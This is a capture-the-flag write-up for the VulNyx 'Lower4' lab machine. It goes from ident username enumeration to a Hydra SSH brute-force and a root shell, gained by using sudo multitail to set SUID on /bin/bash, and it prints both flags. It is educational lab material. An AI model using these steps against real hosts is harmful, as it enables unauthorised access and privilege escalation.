# [VulNyx](https://vulnyx.com/): Lower4 Machine Writeup  

<img width="671" height="426" alt="image" src="https://github.com/user-attachments/assets/21bb5603-b5a6-4b82-8ab4-d546c947a879" />

---

# 🎯 Target Information

- **Platform:** VulNxy.com 
- **Machine Name:** Lower4   
- **Key Vulnerabilities:**
  - Username Enumeration via Ident
  - Weak SSH Credentials
  - Misconfigured Sudo Permissions
  - Privilege Escalation via SUID Bash

---

# 🔍 Network Discovery

First, scan the local network to identify active hosts using `arp-scan`.

```bash
$ sudo arp-scan  --localnet
[sudo] password for arc: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:8d:a8:e2, IPv4: 192.168.29.56
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.29.4    f6:ad:e9:27:6f:23       (Unknown: locally administered)
192.168.29.1    d8:78:c9:bd:6b:b7       (Unknown)
192.168.29.14   00:0c:29:75:5a:a9       (Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.869 seconds (136.97 hosts/sec). 3 responded
          
```

The target machine IP address was identified as:

```text
192.168.29.14
```

---

# 🔎 Enumeration

## Nmap Scan

Perform a full TCP port scan:

```bash
nmap -n -Pn -sSV -p- --min-rate 5000 192.168.29.14
```

## Scan Results

```bash
$ nmap -n -Pn -sVS  -p- --min-rate 5000  192.168.29.14 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-12 08:03 -0700
Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 08:04 (0:00:23 remaining)
Nmap scan report for 192.168.29.14
Host is up (0.0012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
113/tcp open  ident?
MAC Address: 00:0C:29:75:5A:A9 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.93 seconds
```

### Findings
- Port **22** → SSH
- Port **80** → HTTP
- Port **113** → Ident Service

The Ident service appeared particularly interesting and potentially vulnerable to user enumeration.

---

# 🌐 Web Enumeration

Open port 80 in the browser.
<br>
<br>
<img width="1195" height="444" alt="Screenshot 2026-05-11 211258" src="https://github.com/user-attachments/assets/dff1bcf4-76e2-4eb4-98c1-27c94ed5066c" />
### Observation

The website displayed only the default Apache page.

No useful information was discovered.

---

# 📂 Directory Enumeration

Use Gobuster to search for hidden directories:

```bash
gobuster dir -u http://192.168.29.14/ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

## Result

```text
$ gobuster dir -u http://192.168.29.14/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

 ===============================================================
 Gobuster v3.8.2
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 [+] Url:                     http://192.168.29.14/
 [+] Method:                  GET
 [+] Threads:                 10
 [+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 [+] Negative Status codes:   404
 [+] User Agent:              gobuster/3.8.2
 [+] Timeout:                 10s
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
 .hta                 (Status: 403) [Size: 278]
 .htaccess            (Status: 403) [Size: 278]
 .htpasswd            (Status: 403) [Size: 278]
 index.html           (Status: 200) [Size: 10701]
 server-status        (Status: 403) [Size: 278]
 Progress: 4751 / 4751 (100.00%)
 ===============================================================
 Finished
 ===============================================================
```

No additional directories or sensitive files were discovered just default `index.html`.

---

# 🔍 Username Enumeration

Use the [`ident-user-enum`](https://www.kali.org/tools/ident-user-enum/) tool against port 113:

```bash
ident-user-enum 192.168.29.14 113
```

## Result

```text
$ ident-user-enum 192.168.29.14 113
 ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

 192.168.29.14:113       lucifer
```

### Important Finding
A valid username was identified:

```text
lucifer
```

---

# 🔓 SSH Brute Force

Use Hydra to brute-force the SSH password:

```bash
hydra -l lucifer -P /usr/share/wordlists/rockyou.txt \
ssh://192.168.29.14
```
```
$ hydra -l lucifer -P /usr/share/wordlists/rockyou.txt ssh://192.168.29.14
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-12 08:05:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.29.14:22/
[STATUS] 227.00 tries/min, 227 tries in 00:01h, 14344175 to do in 1053:11h, 13 active

[22][ssh] host: 192.168.29.14   login: lucifer   password: 789456123

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-12 08:06:27
```
We found the  password: `789456123`

now let login to ssh using username an password and verife the id, username and the sudo permissions we have .
```

## Credentials Found

```text
Username: lucifer
Password: 789456123
```

---

# 🖥 Initial Access

Login through SSH:

```bash
ssh lucifer@192.168.29.14
```

## Verify User

```bash
lucifer@lower4:~$ id ; whoami
uid=1000(lucifer) gid=1000(lucifer) grupos=1000(lucifer)
lucifer
```

Successfully gained access as user `lucifer`.

---

# ⚠️ Sudo Enumeration

Check sudo permissions:

```bash
sudo -l
```

## Result

```text
lucifer@lower4:~$ sudo -l
Matching Defaults entries for lucifer on lower4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucifer may run the following commands on lower4:
    (root) NOPASSWD: /usr/bin/multitail
```

### Important Finding
The user can execute `/usr/bin/multitail` as root without a password.

---

# 🔍 Checking Bash Permissions

View the permissions of `/bin/bash`:

```bash
ls -l /bin/bash
```

## Result

```bash
-rwxr-xr-x 1 root root 1234376 Mar 27 2022 /bin/bash
```

### Explanation
Currently, `/bin/bash` executes with normal user privileges.

---

# 🚀 Privilege Escalation

Use `multitail` with sudo and root user privileges to modify the permissions of `/bin/bash`:

```bash
sudo -u root /usr/bin/multitail -l "chmod 4755 /bin/bash"
```

Verify the updated permissions:

```bash
ls -l /bin/bash
```

## Result

```bash
-rwsr-xr-x 1 root root 1234376 Mar 27 2022 /bin/bash
```

### Important Observation
The `s` bit replaced the executable bit:
```text
rwx
```
TO
```text
rws
```

This indicates that the SUID bit is enabled.

### Explanation
When executed, `/bin/bash` will now run with the effective privileges of its owner (`root`) rather than the current user.

---

# 👑 Gaining Root Access

Execute bash in privileged interactive mode:

```bash
/bin/bash -pi
```

### Flags
- `-p` → Preserve privileged mode
- `-i` → Interactive shell

---

# ✅ Verification

Check the current user:

```bash
whoami
```

## Result

```text
lucifer@lower4:~$ /bin/bash -pi
bash-5.1# whoami 
root
```

Successfully escalated privileges to root.

---

# 🏁 Flags

## 📄 User Flag

```bash
cat /home/lucifer/user.txt
```

```text
8e99e9f5a7d2d7a067314e34d9fd957f
```

---

## 👑 Root Flag

```bash
cat /root/root.txt
```

```text
c07db370f9e16dcde97d554b38c9c08e
```

---
## Ident protocol (port 113)
```
The Ident protocol (port 113) is a legacy service used to identify the username
associated with a TCP connection on a remote system.
It was commonly used by IRC, FTP, and mail servers for logging and access control.
During penetration testing, Ident can be abused for username
enumeration because it may reveal valid system usernames without authentication.
```
# 🧾 Summary

| Phase | Technique |
|------|-----------|
| Network Discovery | arp-scan |
| Enumeration | Nmap |
| Username Enumeration | ident-user-enum |
| Credential Attack | Hydra |
| Initial Access | SSH |
| Privilege Escalation | Misconfigured Sudo |
| Root Access | SUID Bash |

---

# 🚀 Key Takeaways

- The Ident service can leak valid usernames.
- Weak passwords remain a major security risk.
- Always enumerate sudo permissions carefully.
- Misconfigured binaries running with sudo can lead to full system compromise.
- SUID binaries are a powerful privilege escalation technique.

---

## **Author:** [zer0arc4](https://github.com/zer0arc4)
